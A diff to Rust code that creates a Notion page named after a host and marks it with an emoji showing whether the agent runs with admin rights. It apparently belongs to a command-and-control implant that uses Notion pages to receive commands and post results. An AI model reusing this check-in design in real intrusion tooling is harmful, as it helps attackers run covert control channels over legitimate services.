@@ -54,15 +54,27 @@ pub async fn send_result(client: &Client, command_block_id: &str, output: String
 /// 
 /// The returned value is the id of the new page, to be used with
 /// `doc::get_blocks()`
-pub async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: String, logger: &Logger) -> Option<String> {
+pub async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: String, logger: &Logger, is_admin: bool) -> Option<String> {
     logger.info(format!("Creating page..."));
     let url = format!("{}/pages/", URL_BASE);
     
+    let mut check_in_emoji: String = "".to_string();
+
+    if is_admin {
+        check_in_emoji.push_str("#️⃣");
+    } else {
+        check_in_emoji.push_str("💲");
+    }
+
     // Craft JSON Body
     let body: serde_json::Value = json!({
         "parent": {
             "type": "page_id",
             "page_id": config_options.parent_page_id
+        },
+        "icon": {
+            "type": "emoji",
+            "emoji": &check_in_emoji
         },
         "properties": {
             "title": [{
